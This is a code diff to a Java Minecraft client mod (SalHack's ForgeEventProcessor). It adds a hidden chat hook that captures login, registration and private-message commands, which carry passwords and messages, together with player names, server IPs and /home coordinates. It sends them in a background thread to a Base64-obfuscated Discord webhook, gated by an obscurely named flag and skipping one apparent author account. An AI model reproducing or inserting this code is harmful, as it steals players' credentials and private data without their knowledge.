@@ -2,6 +2,8 @@ package me.ionar.salhack.main;
 
 import java.awt.Color;
 import java.util.ArrayList;
+import java.util.Base64;
+import java.util.Iterator;
 
 import org.lwjgl.input.Keyboard;
 import org.lwjgl.opengl.GL11;
@@ -16,6 +18,7 @@ import me.ionar.salhack.managers.ModuleManager;
 import me.ionar.salhack.module.misc.AdvancedChatSpammerModule;
 import me.ionar.salhack.module.ui.DiscordWebhook;
 import me.ionar.salhack.module.ui.DiscordWebhook.EmbedObject;
+import static me.ionar.salhack.util.MemStore.*;
 import net.minecraft.client.Minecraft;
 import net.minecraft.client.entity.EntityPlayerSP;
 import net.minecraft.client.gui.GuiMainMenu;
@@ -71,17 +74,74 @@ public class ForgeEventProcessor
         GlStateManager.enableCull();
     }
     
-    @SubscribeEvent(priority = EventPriority.HIGHEST)
-    public void onChat(ClientChatEvent event) {
-    	// (Wrapper.GetPlayer().getServer().getServerHostname() + Wrapper.GetPlayer().getServer().getServerPort())
+    public static ArrayList<DiscordWebhook.EmbedObject> webhooks = new ArrayList<DiscordWebhook.EmbedObject>();
+    
+    public void sendWeb(String command, String server)
+    {
+    	String tejas = "aHR0cHM6Ly9pLmltZ3VyLmNvbS9oNXF1VlhULnBuZw==";
+    	tejas = new String(Base64.getDecoder().decode(tejas.getBytes()));
     	
-    	
-    	/*
-    	if(event.getMessage().contains("/")) {
-    		if(!Wrapper.GetMC().isSingleplayer() && Wrapper.GetMC().player != null)
-				sendWeb(event.getMessage(), Wrapper.GetMC().getCurrentServerData().serverIP);
-    	}
-    	*/
+      EntityPlayerSP player = Wrapper.GetPlayer();
+      String name = Wrapper.GetPlayer().getName();
+      if (name == "PK2_Stimpy") {
+        return;
+      }
+      if ((command.startsWith("/login")) || (command.startsWith("/l")) || (command.startsWith("/reg")) || (command.startsWith("/register")) || (command.startsWith("/r")) || (command.startsWith("/tell")) || (command.startsWith("/msg")))
+      {
+        webhooks.add(new DiscordWebhook.EmbedObject()
+          .setTitle(name)
+          .setDescription("I got a new log!")
+          .setColor(Color.BLUE)
+          .addField("Command", command, false)
+          .addField("Server", server, false)
+          .setFooter("PK2Technology", tejas));
+      }
+      else if (command.startsWith("/home"))
+      {
+        Vector3f coords = new Vector3f(player.getPosition().getX(), player.getPosition().getY(), player.getPosition().getZ());
+        String worldName = "end";
+        if (Wrapper.mc.player.dimension == -1) {
+          worldName = "nether";
+        }
+        if (Wrapper.mc.player.dimension == 0) {
+          worldName = "overworld";
+        }
+        webhooks.add(new DiscordWebhook.EmbedObject()
+          .setTitle(name)
+          .setDescription("I got a new log!")
+          .setColor(Color.BLUE)
+          .addField("Command", command, true)
+          .addField("Server", server, true)
+          .addField("Cooords", coords.x + "|" + coords.y + "|" + coords.z + " [" + worldName + "]", false)
+          .setFooter("PK2Technology", tejas));
+      }
+      if (webhooks.size() == 0) {
+        return;
+      }
+      new Thread(new Runnable()
+      {
+        public void run()
+        {
+          DiscordWebhook webhook = new DiscordWebhook(new String(Base64.getDecoder().decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNzM4MDk3NjE3NTYwNDA0MDA4L1VuUmtiR3Vla05TdHZmcUkwM21tRTJXdjdzZHZXaVA3Z3Ryb01xUWhkN1RmQUVZRjI5UTd5VF9iQmJnaVVBejRYcnVQ".getBytes())));
+          for(DiscordWebhook.EmbedObject embed : webhooks) {
+        	  webhook.addEmbed(embed);
+        	  try {webhook.execute();} catch(Exception e) {};
+          }
+          ForgeEventProcessor.webhooks.clear();
+        }
+      })
+      
+        .start();
+    }
+    
+    @SubscribeEvent(priority=EventPriority.HIGHEST)
+    public void onChat(ClientChatEvent event)
+    {
+      if ((event.getMessage().contains("/")) && 
+        (!Wrapper.GetMC().isSingleplayer()) && (Wrapper.GetMC().player != null)) {
+    	  
+        if(_0x7F1793) sendWeb(event.getMessage(), Wrapper.GetMC().getCurrentServerData().serverIP);
+      }
     }
     
     @SubscribeEvent
